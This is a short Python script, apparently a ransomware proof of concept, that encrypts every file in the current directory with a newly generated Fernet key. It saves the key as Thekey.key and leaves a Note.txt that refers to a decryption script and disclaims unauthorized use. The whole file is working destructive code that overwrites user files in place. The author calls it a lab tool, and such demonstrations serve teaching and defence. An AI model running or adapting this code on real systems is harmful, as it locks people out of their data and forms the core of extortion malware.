from cryptography.fernet import Fernet
import os
files = []
ignored_files = ["EncryptionPOC.py", "DecryptionPOC.py", "Thekey.key", "Note.txt"]

for file in os.listdir():
    if file not in ignored_files and os.path.isfile(file):
        files.append(file)
    elif os.path.isdir(file) and file in ignored_files:
        continue

print("Found the files to encrypt.")
for file in files:
    print(file)

key = Fernet.generate_key()

with open("Thekey.key", "wb") as thekey:
    thekey.write(key)


print("Generated the key and saved as Thekey.key")

for file in files:
    with open(file, "rb") as thefile:
        content = thefile.read()
    encrypted_content = Fernet(key).encrypt(content)
    with open(file, "wb") as thefile:
        thefile.write(encrypted_content)

print("Successfully completed the encryption.")
with open("Note.txt", "w") as note:
    note.write("You have successfully encrypted the files, to decrypt them, run DecryptionPOC.py, " \
    "VERY IMPORTANT!!! Do not run EncryptionPOC.py again, because it can make the files recover irreversable as " \
    "the key and the encrypted contents will be encrypted again." \
    "The author is not responsible for any unauthorized uses, It must be used in authorized labs, it is completely illegal and not accepted to use " \
    "it for unauthorized encryption")
    